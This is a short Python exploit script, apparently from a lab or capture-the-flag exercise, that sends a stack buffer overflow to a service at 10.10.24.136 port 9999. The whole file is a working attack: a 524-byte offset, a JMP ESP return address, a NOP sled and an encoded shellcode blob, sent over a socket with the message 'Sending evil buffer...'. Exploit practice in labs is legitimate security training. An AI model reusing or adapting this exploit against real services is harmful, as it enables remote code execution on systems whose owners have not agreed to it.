import socket

ip = "10.10.24.136"
port = 9999

shellcode =  ""
shellcode += "\xbb\xb5\x70\x6e\xc2\xda\xc0\xd9\x74\x24\xf4"
shellcode += "\x5a\x33\xc9\xb1\x12\x83\xc2\x04\x31\x5a\x0e"
shellcode += "\x03\xef\x7e\x8c\x37\x3e\xa4\xa7\x5b\x13\x19"
shellcode += "\x1b\xf6\x91\x14\x7a\xb6\xf3\xeb\xfd\x24\xa2"
shellcode += "\x43\xc2\x87\xd4\xed\x44\xe1\xbc\xe7\xbe\x2d"
shellcode += "\xb1\x90\xbc\x4d\xd8\x3c\x48\xac\x6a\xda\x1a"
shellcode += "\x7e\xd9\x90\x98\x09\x3c\x1b\x1e\x5b\xd6\xca"
shellcode += "\x30\x2f\x4e\x7b\x60\xe0\xec\x12\xf7\x1d\xa2"
shellcode += "\xb7\x8e\x03\xf2\x33\x5c\x43"

bufflen = 6000
offset = 524
jmp_esp = "\xf3\x12\x17\x31"
padding = "\x90" * 25
payload = shellcode
postfix = "\r\n"

buffer = "A" * offset
buffer += jmp_esp
buffer += padding
buffer += payload
buffer += "C" * (bufflen - len(buffer))
buffer += postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
